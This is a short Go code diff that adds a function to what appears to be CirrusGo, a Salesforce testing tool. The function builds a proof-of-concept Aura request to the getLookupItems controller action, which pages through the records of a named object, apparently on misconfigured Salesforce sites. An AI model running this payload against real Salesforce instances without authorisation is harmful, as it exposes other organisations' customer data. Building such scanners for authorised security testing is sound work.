@@ -67,3 +67,26 @@ func PayloadGeneratorWritableOBJ(objectName string) []byte {
 	}
 	return genPOC
 }
+
+
+func PayloadGeneratorSearchObj(objectName string, page_size int, page int) []byte {
+
+	payload1 := `[{"id":"CirrusGo","descriptor":"serviceComponent://ui.search.components.forcesearch.scopedresultsdataprovider.ScopedResultsDataProviderController/ACTION$getLookupItems","callingDescriptor":"UNKNOWN","params":{"scope":"`
+	payload2 := objectName
+	payload3 := `","term":"Ae",`
+	payload4 := fmt.Sprintf(`"pageSize":%d`, page_size)
+	payload5 := fmt.Sprintf(`,"currentPage":%d`, page)
+	payload6 := `,"enableRowActions":"False","additionalFields":[],"useADS":"False"}}]`
+	finalpayload := []byte(payload1 + payload2 + payload3 + payload4 + payload5 + payload6)
+
+	p := payload{
+		Massage: json.RawMessage(finalpayload),
+	}
+	genPOC, err := json.Marshal(p)
+
+	if err != nil {
+		panic(err)
+
+	}
+	return genPOC
+}
